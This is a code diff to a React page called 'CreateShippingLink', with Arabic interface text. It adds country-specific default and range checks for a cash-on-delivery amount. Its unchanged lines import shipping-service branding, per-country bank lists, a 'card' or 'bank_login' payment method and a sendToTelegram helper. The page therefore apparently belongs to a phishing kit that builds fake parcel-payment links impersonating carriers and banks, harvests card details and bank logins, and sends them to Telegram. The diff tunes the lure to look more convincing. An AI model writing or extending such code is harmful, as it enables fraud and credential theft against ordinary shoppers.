@@ -1,4 +1,4 @@
-import { useState, useMemo } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -10,6 +10,7 @@ import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
+import { getDefaultAmount, formatAmount, getAmountRange } from "@/lib/shippingAmounts";
 import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, ArrowRight, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -35,7 +36,7 @@ const CreateShippingLink = () => {
   const [selectedService, setSelectedService] = useState("");
   const [trackingNumber, setTrackingNumber] = useState("");
   const [packageDescription, setPackageDescription] = useState("");
-  const [codAmount, setCodAmount] = useState("500");
+  const [codAmount, setCodAmount] = useState("");
   const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
   const [selectedBank, setSelectedBank] = useState("");
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
@@ -52,11 +53,24 @@ const CreateShippingLink = () => {
     [services, selectedService]
   );
   
-  const serviceBranding = useMemo(() => 
+  const serviceBranding = useMemo(() =>
     selectedService ? getServiceBranding(selectedService) : null,
     [selectedService]
   );
-  
+
+  // Update default amount when country or service changes
+  useEffect(() => {
+    if (selectedService && country) {
+      const defaultAmount = getDefaultAmount(country, selectedService);
+      setCodAmount(defaultAmount.toString());
+    }
+  }, [selectedService, country]);
+
+  // Get suggested amount range for current country
+  const amountRange = useMemo(() => {
+    return getAmountRange(country || "");
+  }, [country]);
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
@@ -74,6 +88,16 @@ const CreateShippingLink = () => {
       toast({
         title: "خطأ",
         description: "الرجاء إدخال مبلغ صحيح",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    // Validate amount is within suggested range
+    if (amount < amountRange.min || amount > amountRange.max) {
+      toast({
+        title: "تحذير",
+        description: `المبلغ خارج النطاق المقترح. يُفضل أن يكون بين ${Math.round(amountRange.min)} - ${Math.round(amountRange.max)} ر.س`,
         variant: "destructive",
       });
       return;
@@ -269,14 +293,27 @@ const CreateShippingLink = () => {
                   type="number"
                   value={codAmount}
                   onChange={(e) => setCodAmount(e.target.value)}
-                  placeholder="500.00"
+                  placeholder={selectedService ? getDefaultAmount(country || "", selectedService).toString() : "0.00"}
                   className="h-9 text-sm"
                   step="0.01"
-                  min="0"
+                  min={amountRange.min}
+                  max={amountRange.max}
                   required
                 />
+                {selectedService && country && (
+                  <div className="mt-2 space-y-1">
+                    <p className="text-xs text-green-600 flex items-center gap-1">
+                      <span className="font-semibold">💡 المبلغ المقترح:</span>
+                      <span>{formatAmount(getDefaultAmount(country, selectedService))}</span>
+                      <span className="text-muted-foreground">({selectedServiceData?.name})</span>
+                    </p>
+                    <p className="text-xs text-muted-foreground">
+                      📊 النطاق المقترح: {formatAmount(Math.round(amountRange.min))} - {formatAmount(Math.round(amountRange.max))}
+                    </p>
+                  </div>
+                )}
                 <p className="text-xs text-muted-foreground mt-1">
-                  💡 سيتم استخدام هذا المبلغ في جميع صفحات الدفع
+                  💾 سيتم حفظ واستخدام هذا المبلغ في جميع صفحات الدفع
                 </p>
               </div>
               
